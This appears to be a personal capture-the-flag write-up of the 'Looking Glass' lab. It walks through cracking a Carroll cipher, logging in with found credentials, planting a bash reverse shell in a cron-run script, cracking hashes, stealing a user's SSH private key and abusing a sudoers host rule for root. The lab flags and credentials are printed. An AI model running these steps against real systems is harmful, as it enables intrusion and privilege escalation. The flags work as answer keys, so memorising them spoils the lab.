nmap reveal that port 9000 through 13783 is open and is running an SSH server.
It seems, through me trying it, that ports between those numbers is also running an ssh server.

If we try to ssh into it, we get the response Lower or Higher depending on which port number we choose. The hint is O(log n), which I assume it is a hint to the search algorithm to use. Can't remember
the name of it, but you start with a min and a max and a middle. If middle==lower, it becomes the new min. If higher it becomes the new max. Continue until you found the port.

Trough this process, we find that if we try to ssh to port 10211 we get an interesting message:

# ssh -o "StrictHostKeyChecking no" -p 12967 10.10.177.183

Enter Secret:

From the last room, we can recognize this as the poem "Jabberwocky" but ciphered in some way.
By doing some reading the last time I did this room, I managed to dig up that the author of Alice in Wonderland (Lewis Carrol), also created
a Vigenere type-cipher called The Alphabet Cipher https://en.wikipedia.org/wiki/The_Alphabet_Cipher which he was convinced was unbreakable,
but it was quickly proved wrong.

We can use this site to crack the cipher: https://www.guballa.de/vigenere-solver

Here we find out that it is the poem Jabberwocky, with a line amended at the end.
"Your secret is bewareTheJabberwock"

When we enter the secret in the ssh-prompt we get:
jabberwock:DeeplyGleamBroilingStuffed

which looks like credentials.

Now we could try those on port 22.

This lets us in to the server, and we find the flag:
jabberwock@looking-glass:~$ cat user.txt
}32a911966cab2d643f5d57d9e0173d56{mht

This looks reversed, so the proper flag is
jabberwock@looking-glass:~$ cat user.txt | rev
thm{65d3710e9d75d5f346d2bac669119a23}

Now lets try to get a root shell.

sudo -l doesn't give us much.
$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot

We can reboot the machine, but that won't do much good.

But crontab looks a lot more fun:
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command

#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh

The contents if twasBrillig.sh
$ cat twasBrillig.sh
wall $(cat /home/jabberwock/poem.txt)

So it cat:s out the contenxt of poem.txt to every user at boot, like a MOTD.
We might be able to insert a reverse shell in twasBrillig.sh, so we can get a shell as tweedledum, like so:
$ cat twasBrillig.sh
wall $(cat /home/jabberwock/poem.txt)
bash -i >& /dev/tcp/10.10.156.142/4444 0>&1

After a reboot, bingo!
# nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.177.183 34748 received!

bash: no job control in this shell
tweedledum@looking-glass:~$ id
id
uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)

Now lets try to get some persistence so we don't have to work from a reverse shell.

We generate a ssh-key and paste it into /home/tweedledum/.ssh/authorized_keys, that way we can
log in without knowing the password. If I remember my SSH correctly.

This file doesn't exist, so we have to create it.

We create an ssh key using ssh-keygen:
# ssh-keygen

and I chose to save it to /root/.ssh/tweedledum
We then paste the contents of /root/.ssh/tweedledum.pub into /home/tweedledum/.ssh/authorized_keys on the remote machine.
Preferably change "root@IP" at the end of the key so we don't give away our identity to the blue team.

Unfortunately that didn't work, I need to read up on why.
The current permissions on .ssh on the target:
drwxrwxr-x 2 tweedledum tweedledum 4096 Aug 13 21:35 .ssh
-rw-rw-r-- 1 tweedledum tweedledum  397 Aug 13 21:35 authorized_keys

Changing them to 700 for .ssh/ and 600 for authorized_keys doesn't seem to work either.

/etc/ssh/sshd_config holds the answer. It looks like no user can log in remotely, except jabberwock (and perhaps alice)
Match User tweedledee
        PubkeyAuthentication no
        PasswordAuthentication no
Match User tweedledum
        PubkeyAuthentication no
        PasswordAuthentication no
Match User humptydumpty
        PubkeyAuthentication no
        PasswordAuthentication no
Match User jabberwock
        PubkeyAuthentication no


So we'll just work from the reverse shell for now.

I'm not great at reading this output. Does this mean that tweedledee can run /bin/bash
as sudo without as password? Or does it just mean that tweedledee can run /bin/bash without a password?
tweedledum@looking-glass:~$ sudo -l
sudo -l
Matching Defaults entries for tweedledum on looking-glass:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tweedledee may run the following commands on looking-glass:
    (tweedledee) NOPASSWD: /bin/bash

This means that I want to side-escalate (is that a word?) to tweedledee.

In the /home/tweedledum we see a humptydumpty.txt:
tweedledum@looking-glass:~$ cat humptydumpty.txt

These look like hashes. They are 64 characters long, so I assume they are sha256 hashes.
Lets see if we can crack them using hashcat:
# hashcat -m 1400 -o outfile.txt humptydumpty.txt /usr/share/wordlists/rockyou.txt
# hashcat -m 1400 -o outfile.txt humptydumpty.txt /usr/share/wordlists/fasttrack.txt

fasttrack.txt and rockyou.txt seems to crack different hashes, and only 3-4 of them.

I've saved the ones I cracked with hashcat, and googled, in list.txt

The hashes can be decrypted to (in no specific order):
maybe
one
of
these
is
the
password

Some of them I was able to find in fasttrack.txt, rockyou.txt and milw0rm.txt.
Funnily enough, fasttrack.txt was unable to find "maybe", even though it is in the list.

The only hash that I haven't found the cleartext for is
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
None of the usual websites finds a cleartext for it.

At this point I'm quite lost, so I had a peek at a walkthrough.
It hinted to the fact that the reson I can't find a sha256-cleartext is because
its not a SHA256 hash, but a hex-number. Which, if we look at the string
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b

it seems to be patterns recurring. Ie, "73" occurs 3-4 times, there is quite a lot
of 7:s etc. In other words, it doesn't really look like a hash, which would look
more random.

If we decode it from hex using CyberChef we get the string:
"the password is zyxwvutsrqponmlk"

So I assume that the password to the humptydumpty user is zyxwvutsrqponmlk

Although, now we run into another issue:
su humptydumpty
su: must be run from a terminal

This blog-post outlines a few ways of doing it:
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

One of those ways is to use python to spawn a shell, which worked:
python3 -c 'import pty; pty.spawn("/bin/bash")'
tweedledum@looking-glass:/home$

And we can now su to humptydumpty:
humptydumpty@looking-glass:~$ id
id
uid=1004(humptydumpty) gid=1004(humptydumpty) groups=1004(humptydumpty)

I can't find much useful things here. There is a poetry.txt in humptydumpty:s home-dir,
where he explains a poem to alice.

However, if we take a look at the home-directories we see that /home/alice have
the x-bit set for all users. For directories, this means that we can access files
in it, but we can't "read" (list files) in it.

One way to get around this is to cd into it, and use cd:s tab completion to enumerate
directories and files. Unfortunately, our shell is crappy enough so that is not possible.
Lets see if we can amend that by spawning a better shell somehow.

By reading this blog post https://0xffsec.com/handbook/shells/full-tty/ I found that 
we could get a fully interactive shell by Ctrl-Z:ing nc to the background, run
stty raw -echo && fg

and then we have a fuly interactive shell with tab completion. I dont quite fully
understand how shells work, so this is something I need to read up on.

Lets go ahead and enumerate /home/alice. One thing I remember about alice,
if we refer to earlier in the writeup, is that alice is not blocked from ssh:ing
into the machine, according to /etc/ssh/sshd_config. So if we can get a hold
of a password, or plant an ssh key, we dont have to everything through a reverse shell.

Turns out we still cant tab-complete cd, but we should be able to find out if .ssh/authorized_keys exists.
Yup:
humptydumpty@looking-glass:/home/alice$ file /home/alice/.ssh/authorized_keys
/home/alice/.ssh/authorized_keys: OpenSSH RSA public key

And we can access alice:s private/public keys:
humptydumpty@looking-glass:/home$ cat /home/alice/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
KEY
-----END RSA PRIVATE KEY-----

humptydumpty@looking-glass:~$ cat /home/alice/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGY+dwBeKw2NtTbGLN+3hpg+qZ9ebXvfkU+UZ/iP0TFmGWaYM0hFyE9oVSoldBmLmvJAfpjFk/kgglcQ0r5rhahEPI+jIYr/retdOf8hZYpCRr21DbGt2fLF3Bu2Io/Uvhur/i9Tc5RwD5pgfGqHKrf1qul5x4dWK36NU+uIeIIDveTuAcKCmTBZzM1rkwwaj7UKDiJ/N9+/i6E+TEEsuXd/isF/zhGa4oQTLpthn79Y4SAeV+SzmeAWeJbvHZHe/KrvHIOvCJcSN9bjJh76QuIZnLKTWJrscaE0qkhG5890l1P6s0auNgUuOHN5ZgGYfHsmSGQRQUhXHplXXL6CKF alice@looking-glass

So lets copy them both to our kali-machine, and see if we can ssh into alice@looking-glass.
Bingo! Now we can finally leave the revshell behind, here's to hoping that the
ssh key doesn't change at reboot.
$ ssh -i alice alice@10.10.88.109
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$ id
uid=1005(alice) gid=1005(alice) groups=1005(alice)

What to do now?
Remember that tweedledee can run /bin/bash as sudo, so we want to become
tweedledee.

Once again got stuck and consulted a walkthrough. I can't run sudo -l as alice,
since it prompts for a password I dont have, but I can cat /etc/sudoers.d/alice,
and then we get:
/etc/sudoers.d$ cat alice
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash

ssalg-gnikool is "looking-glass" backwards, which means that alice can
run /bin/bash as root from the host ssalg-gnikool.

By using the -h option, we are able to run /bin/bash:
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~#

And we have the flag
# cat /root/root.txt | rev
thm{bc2337b6f97d057b01da718ced6ead3f}
